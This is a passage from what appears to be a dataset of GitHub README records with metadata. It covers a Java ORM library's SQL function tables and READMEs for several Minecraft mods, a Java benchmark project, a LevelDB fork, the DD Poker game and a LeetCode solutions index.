| systemNow      |    | LocalDateTime           | 获取当前的系统日期时间          |
| nowDate        |    | LocalDate               | 获取当前的日期              |
| nowTime        |    | LocalTime               | 获取当前的时间              |
| utcNowDate     |    | LocalDate               | 获取当前的utc日期           |
| utcNowTime     |    | LocalTime               | 获取当前的utc时间           |
| addData        |    | LocalDate/LocalDateTime | 日期或日期时间增加指定的单位长度     |
| subDate        |    | LocalDate/LocalDateTime | 日期或日期时间减去指定的单位长度     |
| dateTimeDiff   |    | long                    | 获取两个日期或日期时间相差的指定单位的值 |
| dateFormat     |    | String                  | 格式化日期或日期时间           |
| getYear        |    | int                     | 提取年份                 |
| getMonth       |    | int                     | 提取月份                 |
| getWeek        |    | int                     | 提取周                  |
| getDay         |    | int                     | 提取日                  |
| getHour        |    | int                     | 提取小时                 |
| getMinute      |    | int                     | 提取日                  |
| getSecond      |    | int                     | 提取秒                  |
| getMilliSecond |    | int                     | 提取毫秒                 |
| getDayName     |    | String                  | 获取指定日期在本周周几的全名       |
| getDayOfWeek   |    | int                     | 获取指定日期在本周周几          |
| getDayOfYear   |    | int                     | 获取指定日期是当年的第几天        |
| dateToDays     |    | int                     | 从0000-01-01到指定日期的天数  |
| getLastDay     |    | LocalDate               | 获取本月最后一天的日期          |
| getMonthName   |    | String                  | 获取指定日期的月份名称          |
| getQuarter     |    | int                     | 获取指定日期在第几季度          |
| getWeekDay     |    | int                     | 获取指定日期在本周周几的索引       |
| getWeekOfYear  |    | int                     | 获取本周是今年的第几周          |

`数值相关`

| 函数名      | 参数           | 返回类型   | 功能                        |
|----------|--------------|--------|---------------------------|
| abs      |              | 同入参    |                           |
| cos      |              | double |                           |
| acos     |              | double |                           |
| sin      |              | double |                           |
| asin     |              | double |                           |
| tan      |              | double |                           |
| atan     |              | double |                           |
| atan2    |              | double |                           |
| ceil     |              | int    | 向上取整到最近的整数                |
| floor    |              | int    | 向下取整到最近的整数                |
| cot      |              | double | 余切函数                      |
| degrees  |              | double | 弧度转角度                     |
| radians  |              | double | 角度转弧度                     |
| exp      |              | double |                           |
| big      |              | 同入参    | 获取所有数值中最大的数值              |
| small    |              | 同入参    | 获取所有数值中最小的数值              |
| ln       |              | double |                           |
| log      |              | double |                           |
| log2     |              | double |                           |
| log10    |              | double |                           |
| mod      |              | 同入参    | 取模                        |
| pi       |              | double | 获取PI                      |
| pow      |              | double |                           |
| random   |              | double | 获取0-1的随机小数                |
| round    | (T a)        | int    | 四舍五入取整                    |
| round    | (T a, int b) | 同入参    | 指定截取多少位小数四舍五入取整           |
| sign     |              | int    | 参数为正数、负数和零时分别返回 1, -1 和 0 |
| sqrt     |              | double | 获取平方根                     |
| truncate | (T a)        | int    | 截断所有小数位                   |
| truncate | (T a, int b) | double | 截断指定位数的小数位                |

`字符串相关`

| 函数名          | 参数                                         | 返回类型   | 功能                            |
|--------------|--------------------------------------------|--------|-------------------------------|
| strToAscii   |                                            | int    | 第一个字符的ASCII码                  |
| asciiToStr   |                                            | String | ASCII码转字符串                    |
| length       |                                            | int    | 字符串的长度                        |
| byteLength   |                                            | int    | 字符串的字节长度                      |
| concat       |                                            | String | 拼接字符串                         |
| join         |                                            | String | 根据插值拼接字符串                     |
| numberFormat |                                            | String | 格式化数值                         |
| indexOf      | (String str, String subStr)                | int    | 返回一个字符串中指定子字符串的位置             |
| indexOf      | (String str, String subStr, int offset)    | int    | 返回一个字符串中指定子字符串的位置,并且指定起始搜索的位置 |
| toLowerCase  |                                            | String | 转小写                           |
| toUpperCase  |                                            | String | 转大写                           |
| left         |                                            | String | 返回具有指定长度的字符串的左边部分             |
| right        |                                            | String | 返回具有指定长度的字符串的右边部分             |
| leftPad      |                                            | String | 从左边开始对字符串进行重复填充，直到满足指定的长度     |
| rightPad     |                                            | String | 从右边开始对字符串进行重复填充，直到满足指定的长度     |
| trimStart    |                                            | String | 去除字符串左侧的空格                    |
| trimEnd      |                                            | String | 去除字符串右侧的空格                    |
| trim         |                                            | String | 去除字符串左侧和右侧的空格                 |
| replace      |                                            | String | 替换字符串中指定的字符为新字符               |
| reverse      |                                            | String | 反转字符串                         |
| compare      |                                            | int    | 比较字符串                         |
| subString    | (String str, int beginIndex)               | String | 获取子字符串                        |
| subString    | (String str, int beginIndex, int endIndex) | String | 获取子字符串                        |

`其他`

| 函数名       | 参数                                           | 返回类型 | 功能                                                                      |
|-----------|----------------------------------------------|------|-------------------------------------------------------------------------|
| If        | (boolean condition, T truePart, T falsePart) | T    | 如果condition为true则返回truePart，否则返回falsePart                               |
| ifNull    | (T valueNotNull, T valueIsNull)              | T    | 如果valueNotNull为null则返回valueIsNull，否则返回如果valueNotNull为null则返回valueIsNull |
| nullIf    | (T t1, T t2)                                 | T    | 如果t1 = t2则返回null，否则返回t1                                                 |
| cast      | (Object value, Class\<T> targetType)         | T    | 转换到指定类型                                                                 |
| cast      | (Object value, SqlTypes\<T> targetType)      | T    | 转换到指定类型                                                                 |
| isNull    | (T t)                                        | T    | isNull的快捷方法                                                             |
| isNotNull | (T t)                                        | T    | isNotNull的快捷方法                                                          |****

## java函数到sql表达式的映射

> 以下仅列举映射到mysql的情况，实际会根据数据库类型来决定策略

`String类`

| java                                | sql                              |       
|-------------------------------------|----------------------------------|
| this.contains(arg)                  | this LIKE CONCAT('%',arg,'%')    |
| this.startsWith(arg)                | this LIKE CONCAT(arg,'%')        |
| this.endsWith(arg)                  | this LIKE CONCAT('%',arg)        |
| this.length()                       | CHAR_LENGTH(this)                |
| this.toUpperCase()                  | UPPER(this)                      |
| this.toLowerCase()                  | LOWER(this)                      |
| this.concat(arg)                    | CONCAT(this,arg)                 |
| this.trim()                         | TRIM(this)                       |
| this.isEmpty()                      | (CHAR_LENGTH(this) = 0)          |
| this.indexOf(subStr)                | INSTR(this,subStr)               |
| this.indexOf(subStr,fromIndex)      | LOCATE(subStr,this,fromIndex)    |
| this.replace(oldStr,newStr)         | REPLACE(this,oldStr,newStr)      |
| this.substring(beginIndex)          | SUBSTR(this,beginIndex)          |
| this.substring(beginIndex,endIndex) | SUBSTR(this,beginIndex,endIndex) |
| String.join(delimiter,elements...)  | CONCAT_WS(delimiter,elements...) |

`Math类`

| java                | sql              |
|---------------------|------------------|
| Math.abs(arg)       | ABS(arg)         |
| Math.cos(arg)       | COS(arg)         |
| Math.acos(arg)      | ACOS(arg)        |
| Math.sin(arg)       | SIN(arg)         |
| Math.asin(arg)      | ASIN(arg)        |
| Math.tab(arg)       | TAN(arg)         |
| Math.atan(arg)      | ATAN(arg)        |
| Math.atan2(arg)     | ATAN2(arg)       |
| Math.toDegrees(arg) | DEGREES(arg)     |
| Math.toRadians(arg) | RADIANS(arg)     |
| Math.exp(arg)       | EXP(arg)         |
| Math.floor(arg)     | FLOOR(arg)       |
| Math.log(arg)       | LN(arg)          |
| Math.log10(arg)     | LOG10(arg)       |
| Math.random()       | RAND()           |
| Math.round(arg)     | ROUND(arg)       |
| Math.pow(arg1,arg2) | POWER(arg1,arg2) |
| Math.signum(arg)    | SIGN(arg)        |
| Math.sqrt(arg)      | SQRT(arg)        |

`List接口`

| java               | sql             |
|--------------------|-----------------|
| this.contains(arg) | arg IN (this,,) |

`BigDecimal类`

| java                | sql        |
|---------------------|------------|
| this.add(arg)       | this + arg |
| this.subtract(arg)  | this - arg |
| this.multiply(arg)  | this * arg |
| this.divide(arg)    | this / arg |
| this.remainder(arg) | this % arg |

`Temporal接口`

> LocalDate,LocalDateTime,LocalTime

| java               | sql        |
|--------------------|------------|
| this.isAfter(arg)  | this > arg |
| this.isBefore(arg) | this < arg |
| this.isEqual(arg)  | this = arg |
",0,0,1,0.0,"['database', 'mysql', 'true', 'inject', 'inject', 'inject', 'inject', 'dynamic', 'inject', 'main', 'crud', 'include']","['inject', 'database', 'mysql', 'true', 'dynamic']"
ferriarnus/Monocle,main,"
Monocle
=======

An Iris addon for neoforge that allows Iris to work with Embeddium.

## License
Originally, I was planning on licensing the addon the same as [Iris](https://github.com/IrisShaders/Iris/blob/1.20.3/LICENSE), LGPLv3. 
However, upon further inspection it seems this is ""wrong"" from Iris. Iris makes use of [glsl-transformer](https://github.com/IrisShaders/glsl-transformer?tab=AGPL-3.0-1-ov-file#readme),
a library licensed as AGPL, which is incompatible with LGPL. As a result, from my understanding, the combined project should be considered AGPL as well. 
Iris is aware of the issue, and is working on resolving it. 

As such, the only valid license I can take is AGPL as well, to be in compliance with glsl-transformer used by both Iris and Monocle.",0,2,2,0.0,['license'],['license']
iebb/NekokoLPA,master,"# Nekoko LPA

*super unstable, use at your own risk*

a **not-so-cross-platform** LPA with a React Native frontend.

based on [Infineon Android LPA](https://softwaretools.infineon.com/tools/com.ifx.tb.tool.infineonandroidlpa) by Infineon Technologies AG",15,0,1,0.0,"['nekoko', 'lpa']","['nekoko', 'lpa']"
ivangfr/web-reactive-jvm-native-cds-aot-virtual-threads,main,"# web-reactive-jvm-native-cds-aot-virtual-threads

In this project, we will create six applications using [`Spring Boot`](https://docs.spring.io/spring-boot/index.html), [`Quarkus`](https://quarkus.io/), and [`Micronaut`](https://micronaut.io/) frameworks.

For each framework, we will implement one app with traditional blocking `Web` using `Apache Tomcat` and another app with non-blocking `Reactive` using `Netty`. We will also build both `JVM` and `Native` Docker images for the applications.

For the `Spring Boot` apps, we will build additional Docker images with different configurations, including enabling or not some Java optimizations like `Virtual Threads` ([`JEP 444`](https://openjdk.org/jeps/444)), `CDS` ([`JEP 310`](https://openjdk.org/jeps/310)), and `AOT` ([`JEP 295`](https://openjdk.org/jeps/295)).

## Proof-of-Concepts & Articles

On [ivangfr.github.io](https://ivangfr.github.io), I have compiled my Proof-of-Concepts (PoCs) and articles. You can easily search for the technology you are interested in by using the filter. Who knows, perhaps I have already implemented a PoC or written an article about what you are looking for.

## Additional Readings

### Spring Boot Performance Benchmark

- \[**Medium**\] [**Spring Boot Performance Benchmark: Web, Reactive, CDS, AOT, Virtual Threads, JVM, and Native**](https://medium.com/@ivangfr/spring-boot-performance-benchmark-web-reactive-cds-aot-virtual-threads-jvm-and-native-29295c8099b0)
- \[**Medium**\] [**Spring Boot 3.3.2 Benchmark: Web, Reactive, CDS, AOT, Virtual Threads, JVM, and Native**](https://medium.com/@ivangfr/spring-boot-3-3-2-benchmark-web-reactive-cds-aot-virtual-threads-jvm-and-native-42d3b704e88e)

### Java Frameworks Performance Benchmark

- \[**Medium**\] [**Java Frameworks Performance Benchmark: Spring Boot vs. Quarkus vs. Micronaut**](https://medium.com/@ivangfr/java-frameworks-performance-benchmark-spring-boot-vs-quarkus-vs-micronaut-028b6dbfef2e)
- \[**Medium**\] [**Performance Benchmark: Spring Boot 3.3.2 vs. Quarkus 3.13.2 vs. Micronaut 4.5.1**](https://medium.com/@ivangfr/performance-benchmark-spring-boot-3-3-2-vs-quarkus-3-13-2-vs-micronaut-4-5-1-515bae82d04f)

## Applications

- ### [spring-boot-greetings-api-web](https://github.com/ivangfr/web-reactive-jvm-native-cds-aot-virtual-threads/tree/main/spring-boot-greetings-api-web)
- ### [spring-boot-greetings-api-rective](https://github.com/ivangfr/web-reactive-jvm-native-cds-aot-virtual-threads/tree/main/spring-boot-greetings-api-reactive)
- ### [quarkus-greetings-api-web](https://github.com/ivangfr/web-reactive-jvm-native-cds-aot-virtual-threads/tree/main/quarkus-greetings-api-web)
- ### [quarkus-greetings-api-rective](https://github.com/ivangfr/web-reactive-jvm-native-cds-aot-virtual-threads/tree/main/quarkus-greetings-api-reactive)
- ### [micronaut-greetings-api-web](https://github.com/ivangfr/web-reactive-jvm-native-cds-aot-virtual-threads/tree/main/micronaut-greetings-api-web)
- ### [micronaut-greetings-api-rective](https://github.com/ivangfr/web-reactive-jvm-native-cds-aot-virtual-threads/tree/main/micronaut-greetings-api-reactive)

## Latest Framework Version Used

| Framework   | Version |
|-------------|---------|
| Quarkus     | 3.12.2  |
| Micronaut   | 4.5.1   |
| Spring Boot | 3.3.2   |

## Prerequisites

- [`Java 21+`](https://www.oracle.com/java/technologies/downloads/#java21)
- [`Docker`](https://www.docker.com/)

## Docker Images

The application's JVM and native Docker images can be found at [this Docker Hub link](https://hub.docker.com/u/ivanfranchin).

## Bash scripts

- **docker-build-spring-boot.sh**: this script builds Spring Boot Docker images
- **docker-build-quarkus.sh**: this script builds Quarkus Docker images
- **docker-build-micronaut.sh**: this script builds Micronaut Docker images
- **remove-docker-images.sh**: this script removes all Docker images
",0,0,1,0.0,"['article', 'additional', 'reading', 'spring', 'boot', 'performance', 'benchmark', 'java', 'framework', 'performance', 'benchmark', 'application', 'https', 'https', 'https', 'https', 'https', 'https', 'latest', 'framework', 'version', 'use', 'prerequisite', 'docker', 'image', 'bash', 'script']","['https', 'performance', 'benchmark', 'framework', 'article']"
HiveGamesOSS/leveldb-mcpe-java,main,"# LevelDB MCPE in Java

This project is a fork of https://github.com/pcmind/leveldb aiming to implement the changes made
in https://github.com/Mojang/leveldb-mcpe/ where relevant to allow the library to read MCPE.

For more information see the original repository on use cases / API usage.

Building
--------

**Requirements**

- Git
- Java 11 or higher
- Maven

**Steps**

1. Clone this repository via `git clone git://github.com/HiveGamesOSS/leveldb-mcpe-java.git`.
2. Build the project via `mvn clean install`.
3. Obtain the library from `target/` folder.

Library Usage
--------

You can use the following in your maven pom.xml:

```xml

<dependency>
    <groupId>com.hivemc.leveldb</groupId>
    <artifactId>leveldb</artifactId>
    <version>1.0.0</version>
</dependency>
```

```xml

<dependency>
    <groupId>com.hivemc.leveldb</groupId>
    <artifactId>leveldb-api</artifactId>
    <version>1.0.0</version>
</dependency>
```

This library is aimed as a drop in replacement to the original fork https://github.com/pcmind/leveldb.

License
--------

Details of the LICENSE can be found in the license.txt, this fork maintains the original license for all code and
modifications.
",2,0,1,0.0,"['leveldb', 'mcpe', 'java']","['leveldb', 'mcpe', 'java']"
tuskev1ch/minced-1.20.4,main,"<p align=""center"">
    <a href=""https://discord.gg/QxdMmgafV3"">
        <img src=""https://i.imgur.com/X9KpXIB.png"" style=""width: 20%"">
    </a>
</p>

<h1 align=""center"">Minced 1.20.4 [Fabric]</h1>
<p align=""center"">A Minecraft Fabric Utility Mod</p>

<div align=""center"">
    
[![Discord Mine](https://img.shields.io/discord/1012747861819150456?label=discord&logo=discord&logoColor=white)](https://discord.gg/QxdMmgafV3)

</div>

## Information:
- Be aware `Fecurity Client` are both ratted and renames of this client.

## Requires:
- [FabricLoader 0.15.11+](https://fabricmc.net/use/installer/)  fabric-loader:0.15.11
- [FabricApi 1.20.4](https://www.curseforge.com/minecraft/mc-mods/fabric-api/files/5383731)  fabric-api:0.97.1+1.20.4
- [Java 17+](https://www.oracle.com/java/technologies/javase/jdk17-archive-downloads.html)

## Installation:

### Client:
Move `minced.jar` to the `mods` folder in your launcher directory.


## Credits:
- [ThunderHack Recode](https://github.com/Pan4ur/ThunderHack-Recode)
- [Meteor Client](https://github.com/MeteorDevelopment/meteor-client)

## Licensing
This project is licensed under the [GNU General Public License v3.0](https://www.gnu.org/licenses/gpl-3.0.en.html). 

If you use **ANY** code from the source:
- You must disclose the source code of your modified work and the source code you took from this project. This means you are not allowed to use code from this project (even partially) in a closed-source and/or obfuscated application.
- You must state clearly and obviously to all end users that you are using code from this project.
- Your application must also be licensed under the same license.

*If you have any other questions, check our [Discord](https://discord.gg/QxdMmgafV3) server.*
",1,1,1,0.0,"['information', 'requires', 'installation', 'client', 'credit', 'license']","['information', 'requires', 'installation', 'client', 'credit']"
dougdonohoe/ddpoker,main,"# DD Poker

## About

![dd-poker-3.jpg](images/dd-poker-3.jpg)

This repository contains all the source code for the DD Poker
computer game, the underlying game engine, the supporting 
backend server, and the companion website. The game itself is 
a Java Swing-based desktop application that is capable of running 
on Mac, Linux and Windows.  The backend-server is essentially
a Java Spring application that talks to MySQL.  The website 
(aka ""Online Portal"") is built on the Apache Wicket framework.

## Installers

See [Releases](https://github.com/dougdonohoe/ddpoker/releases) for the latest Mac, Linux and Windows installers.

[<img src=""images/install4j_small.png"">](https://www.ej-technologies.com/install4j)
Installers are built by [Donohoe Digital LLC](https://www.donohoedigital.com/) 
courtesy of a license to ej-technologies' 
[excellent multi-platform installer builder, install4j](https://www.ej-technologies.com/install4j).
We are grateful that they provided us an open-source license.

There is also an option to distribute a jar file, which the _Installers_ section of
the [Developer Notes](README-DEV.md) explains.

## TL;DR Running DD Poker From Source

If you are impatient and just want to run the DD Poker game without
reading all the [developer documentation](README-DEV.md) or worrying
about servers and databases, follow these steps:

1. Clone this repo
2. Install [Java 1.8](https://adoptopenjdk.net/releases.html?variant=openjdk8&jvmVariant=hotspot)
   and [Maven 3](https://maven.apache.org/install.html)
3. Run these commands in the `ddpoker` directory:

```shell
source ddpoker.rc
mvn-package-notests
poker
```

## Developer Notes

For details on how to build and run DD Poker and
the backend server and website, please see [README-DEV.md](README-DEV.md).

## History

DD Poker was developed by Donohoe Digital LLC, a small computer
games studio founded by Doug Donohoe in 2003.  Its first game,
[War! Age of Imperialism](https://www.donohoedigital.com/war/) was
a computer version of the eponymous table-top board game, and it
was a finalist in the 2005 Independent Games Festival.  After releasing
the game in October 2003, Doug was celebrating in Las Vegas
and, while at a poker tournament, the proverbial lightbulb went 
off that there were no good poker software simulators out there,
especially for tournaments.  Leveraging the game 
engine he built for War!, Doug immediately started building
a poker game.  Less that a year later, DD Poker was ready for 
release.

DD Poker 1.0 was originally released (and sold in boxes!) in 
June 2004 under the name 
_DD Tournament Poker No Limit Texas Hold'em_ and 
later re-released in early 2005 as _DD Tournament Poker 2005 Collector's 
Edition_, featuring Annie Duke on the box.  The game featured 
Limit, Pot-Limit and No-Limit Texas Hold'em against computer
components, a poker clock, but no online play.

DD Poker 2.0 added the ability to play online against other
human opponents, a sophisticated hand calculator, a brand-new UI, and dozens
of other new features.  It was originally released in August
2005 as _DD No Limit Texas Hold'em Tournament Edition_, featuring 
Phil Gordon on the box.  To support online play, a back-end
API server and companion ""Online Portal"" was built and operated
by Donohoe Digital.  New functionality continued to be added
until early 2007.

DD Poker 3.0 was released as donation-ware in January 2009,
adding only minor new features while removing license-key 
validation logic. It continued to be updated sporadically until 
it was shutdown in July 2017.

See [whatsnew.html](code/poker/src/main/resources/config/poker/help/whatsnew.html) 
for a detailed release history starting with version 2.0.

## Why Open Source?

Even though DD Poker and the backend servers was shutdown
in July 2017, folks continue to play it by manually
sharing game URLs.  There was a minor revival during the 
2020 pandemic and sporadic inquiries have come in over the
years.

While Donohoe Digital LLC can no longer
run the old DD Poker servers, there might be folks out there that
want to run servers for their own local poker communities.
Releasing the code allows them to do this.

In addition, even though the core code is almost 20 years
old, it still actually works and might be useful to
somebody, somewhere.

## Copyright and Licenses

Unless otherwise noted, the contents of this repository are
Copyright (c) 2003-2024 Doug Donohoe.  All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

For the full License text, please see the [LICENSE.txt](LICENSE.txt) file
in the root directory of this project.

The ""DD Poker"" and ""Donohoe Digital"" names and logos, as well as any images,
graphics, text, and documentation found in this repository (including but not
limited to written documentation, website content, and marketing materials)
are licensed under the Creative Commons Attribution-NonCommercial-NoDerivatives
4.0 International License (CC BY-NC-ND 4.0). You may not use these assets
without explicit written permission for any uses not covered by this License.
For the full License text, please see the [LICENSE-CREATIVE-COMMONS.txt](LICENSE-CREATIVE-COMMONS.txt) file.

For inquiries regarding commercial licensing of this source code or
the use of names, logos, images, text, or other assets, please contact
doug [at] donohoe [dot] info.

## Third Party Licenses and Other Open Source Code

DD Poker incorporates various other open source code, either directly as source files
or via maven dependencies as seen in the `pom.xml` files.  These are explained in 
[code/poker/src/main/resources/config/poker/help/credits.html](https://static.ddpoker.com/gamehelp/help/credits.html) and the licenses 
mentioned therein can be found in the `docs/license` directory.

Third party source code directly copied into this repository include the following:

* Zookitec Explicit Layout in `code/poker/src/main/java/com/zookitec/layout/*.java`
* `MersenneTwisterFast` random number generator in `code/common/src/main/java/com/donohoedigital/base/MersenneTwisterFast.java`
* `RandomGUID` generator in `code/common/src/main/java/com/donohoedigital/base/RandomGUID.java`
* `Base64` encode/decoder in `code/common/src/main/java/com/donohoedigital/base/Base64.java`

## Contributors

The following folks made excellent contributions to the DD Poker
code base as employees of Donohoe Digital:

+ Greg King
+ Sam Neth
+ Brian Zak
",2,0,1,4.0,"['dd', 'poker', 'about', 'installers', 'tl', 'dr', 'running', 'dd', 'poker', 'from', 'source', 'developer', 'note', 'history', 'why', 'open', 'source', 'copyright', 'license', 'third', 'party', 'license', 'other', 'open', 'source', 'code', 'contributor']","['source', 'dd', 'poker', 'open', 'license']"
IMB11/Fog,master,"![Requires Fabric API](https://cdn.imb11.dev/requires_fabric_api.png) [![IMB11 Discord server](https://cdn.imb11.dev/mineblock%20badge_64h.png)](https://discord.imb11.dev/) [![Steve's Underwater Paradise - Steveplays' Discord server](https://cdn.imb11.dev/steve.png)](https://discord.gg/KbWxgGg)

# Fog

As it says on the tin - Fog is a mod that completely revamps how Minecraft handles fog, including its color, start, and end points. It creates a greater sense of depth and atmosphere in Minecraft by shifting the fog start forward, maintaining the same view distance while greatly improving the visuals of the game.

## Features

It should be noted that the majority of these features can be fully customized via the configuration screen or resource packs - if you're using Fabric, you will need Mod Menu to access the configuration screen.

### Cave Fog

As you go deeper underground, the fog gets thicker. This adds to the spooky and mysterious feel of caves, making exploration more intense and immersive. It helps create a sense of depth, making the underground environment feel more alive and engaging.

![Cave Fog comparison (left: Mod Disabled; right: Mod Enabled)](https://cdn.modrinth.com/data/WuGVWUF2/images/4c298cc1a03e59f9b9c1a5d587a4204cae504a39.png)

### Weather Fog

The fog adjusts with the weather, so during rain or snow, the fog will change accordingly. This adds to the overall atmosphere, making each weather condition feel distinct and visually appealing.

![Weather Fog comparison (left: Mod Disabled; right: Mod Enabled)](https://cdn.modrinth.com/data/WuGVWUF2/images/f1ccdd8276b7412e343c70bedec36fb7bd255c0d.png)

### Time-Based Colors

Fog becomes more colorful and vibrant during sunsets, sunrises, and nighttime. This feature enhances the beauty of these moments, providing stunning visuals and a more dynamic environment that changes with the time of day.

![Time-Based Haze comparison (left: Mod Disabled; right: Mod Enabled)](https://cdn.modrinth.com/data/WuGVWUF2/images/f52d639bef3213914c80284fa8b19c0bc03c342e.png)

### Biome Fog Colors

Fog changes color based on the biome you're in, giving each area a unique look and feel. This helps create a coherent visual experience as you move through different biomes. It supports modded biomes and is easy to customize using resource packs, allowing for a highly personalized game experience.

![Biome Fog Colors comparison (left: Mod Disabled; right: Mod Enabled)](https://cdn.modrinth.com/data/WuGVWUF2/images/8cd00399374a9495f8f7ee3188cc76767db61a0b.png)

### Sky Fixes

When flying with an elytra above the clouds, the fog gradually fades away, offering a clear view of the sky without any strange horizon lines.

Additionally, clouds maintain their natural look and are not affected by fog color, ensuring they always appear consistent and visually appealing.

![Sky Fixes comparison (left: Mod Disabled; right: Mod Enabled)](https://cdn.modrinth.com/data/WuGVWUF2/images/5eb2c55f853792271abb509ba853dbbad6e4fdf4.png)

## Dependencies

### Required

- [Fabric API](https://modrinth.com/mod/fabric-api)
- [YetAnotherConfigLib](https://modrinth.com/mod/yacl)
- [M.R.U](https://modrinth.com/mod/mru)

## Compatibility info

### Compatible mods

- [Mod Menu](https://modrinth.com/mod/modmenu): allows access to the configuration screen
- [Sodium](https://modrinth.com/mod/sodium): fully compatible, ensuring that your visuals remain consistent even with performance-enhancing mods
- Shaders that use Minecraft’s default fog settings: fully compatible
- [Distant Horizons](https://modrinth.com/mod/distanthorizons): planned for the future

### Incompatibilities

See the [issue tracker](https://github.com/IMB11/Fog/issues?q=is%3Aissue+is%3Aopen+sort%3Aupdated-desc+label%3Acompat)
for a list of incompatibilities.

## Download

Fog is available for Forge on 1.20.1, and Fabric and NeoForge for 1.20.1, 1.20.4, 1.20.6 and 1.21.  
You can download Fog from the following locations:

- [GitHub Releases](https://github.com/IMB11/Fog/releases)
- [Modrinth](https://modrinth.com/mod/fog)
- [CurseForge](https://www.curseforge.com/minecraft/mc-mods/fog)

## FAQ

- Q: Will you be backporting this mod to lower Minecraft versions?  
  > No - it takes too much time and effort to backport to older versions, and it's not worth the time investment as very little of the community is on those versions.


- Q: Will you be supporting Forge for 1.20.4+?
  > No, you should consider moving to the [NeoForge](https://neoforged.net) mod loader.


- Q: Do you support Quilt?
  > Unfortunately, we are unable to provide support for issues arising from attempting to use this mod with Quilt - you are welcome to try to use it **at your own risk.**


- Q: Does this mod work in multiplayer?  
  > Yes! This mod is fully multiplayer compatible - only clients need to have the mod installed, but if your friends have the mod installed, you should have similar visuals.


- Q: Does only the client need this mod or does the server need it too?  
  > This is a completely client side mod, so only the client needs to have it installed. The server does not need to have it installed.

### For Developers and Server Admins

If you want to add support for your modded biomes, you can utilize Fog's custom JSON fog definition format to create unique fog effects. The mod is fully customizable via resource packs and a dedicated configuration file.

Furthermore, if you're developing a Fabric mod, you can utilize Fog's custom datagen providers to speed your development workflow up when adding compatability with the mod.

Server owners can adjust fog start/end points and biome colors to match their server's aesthetic.

**For more information, check out Fog's [documentation](https://docs.imb11.dev/fog/).**

## License

This project is licensed under All Rights Reserved, see [LICENSE](https://github.com/IMB11/Fog/blob/master/LICENSE).

## Attribution

- [birsy](https://modrinth.com/user/birsy), the original author of [Fog Looks Good Now](https://modrinth.com/mod/fog-looks-good-now) - many of the systems and ideas were expanded from this mod.
- [Steveplays](https://modrinth.com/user/Steveplays), the author of the [Biome Fog](https://modrinth.com/mod/biomefog) mod - who collaborated with me to bring biome fog colors to Fog.
",12,19,1,7.0,"['fog', 'feature', 'cave', 'fog', 'weather', 'fog', 'color', 'biome', 'fog', 'color', 'sky', 'fix', 'dependency', 'require', 'compatibility', 'info', 'compatible', 'mod', 'incompatibility', 'download', 'faq', 'for', 'developer', 'server', 'admins', 'license', 'attribution']","['fog', 'color', 'feature', 'cave', 'weather']"
withaarzoo/LeetCode-Solutions,main,"# LeetCode Solutions

Welcome to the LeetCode Solutions repository! Here, you'll find daily solutions to LeetCode problems, complete with detailed explanations and code in multiple languages.

## Table of Contents

| Problem Number | Problem Name                   | Jump into Code                                  | Explanation                                    | Difficulty Level |
|----------------|--------------------------------|--------------------------------------------------|------------------------------------------------|------------------|
| 40            | Combination Sum II  | [C++](./Algorithms/src/40.%20Combination%20Sum%20II/Code/solution.cpp), [Java](./Algorithms/src/40.%20Combination%20Sum%20II/Code/solution.java), [JavaScript](./Algorithms/src/40.%20Combination%20Sum%20II/Code/solution.js), [Python](./Algorithms/src/40.%20Combination%20Sum%20II/Code/solution.py), [Go](./Algorithms/src/40.%20Combination%20Sum%20II/Code/solution.go) | [Explanation](./Algorithms/src/40.%20Combination%20Sum%20II/Explanation/explanation.md)   | Medium             |
| 273            | Integer to English Words  | [C++](./Algorithms/src/273.%20Integer%20to%20English%20Words/Code/solution.cpp), [Java](./Algorithms/src/273.%20Integer%20to%20English%20Words/Code/solution.java), [JavaScript](./Algorithms/src/273.%20Integer%20to%20English%20Words/Code/solution.js), [Python](./Algorithms/src/273.%20Integer%20to%20English%20Words/Code/solution.py), [Go](./Algorithms/src/273.%20Integer%20to%20English%20Words/Code/solution.go) | [Explanation](./Algorithms/src/273.%20Integer%20to%20English%20Words/Explanation/explanation.md)   | Hard             |
| 350            | Intersection of Two Arrays II  | [C++](./Algorithms/src/350.%20Intersection%20of%20Two%20Arrays%20II/Code/solution.cpp), [Java](./Algorithms/src/350.%20Intersection%20of%20Two%20Arrays%20II/Code/solution.java), [JavaScript](./Algorithms/src/350.%20Intersection%20of%20Two%20Arrays%20II/Code/solution.js), [Python](./Algorithms/src/350.%20Intersection%20of%20Two%20Arrays%20II/Code/solution.py), [Go](./Algorithms/src/350.%20Intersection%20of%20Two%20Arrays%20II/Code/solution.go) | [Explanation](./Algorithms/src/350.%20Intersection%20of%20Two%20Arrays%20II/Explanation/explanation.md)   | Easy             |
| 386            | Lexicographical Numbers  | [C++](./Algorithms/src/386.%20Lexicographical%20Numbers/Code/solution.cpp), [Java](./Algorithms/src/386.%20Lexicographical%20Numbers/Code/solution.java), [JavaScript](./Algorithms/src/386.%20Lexicographical%20Numbers/Code/solution.js), [Python](./Algorithms/src/386.%20Lexicographical%20Numbers/Code/solution.py), [Go](./Algorithms/src/386.%20Lexicographical%20Numbers/Code/solution.go) | [Explanation](./Algorithms/src/386.%20Lexicographical%20Numbers/Explanation/explanation.md)   | Medium             |
| 432            | All O`one Data Structure  | [C++](./Algorithms/src/432.%20All%20O`one%20Data%20Structure/Code/solution.cpp), [Java](./Algorithms/src/432.%20All%20O`one%20Data%20Structure/Code/solution.java), [JavaScript](./Algorithms/src/432.%20All%20O`one%20Data%20Structure/Code/solution.js), [Python](./Algorithms/src/432.%20All%20O`one%20Data%20Structure/Code/solution.py), [Go](./Algorithms/src/432.%20All%20O`one%20Data%20Structure/Code/solution.go) | [Explanation](./Algorithms/src/432.%20All%20O`one%20Data%20Structure/Explanation/explanation.md)   | Hard             |
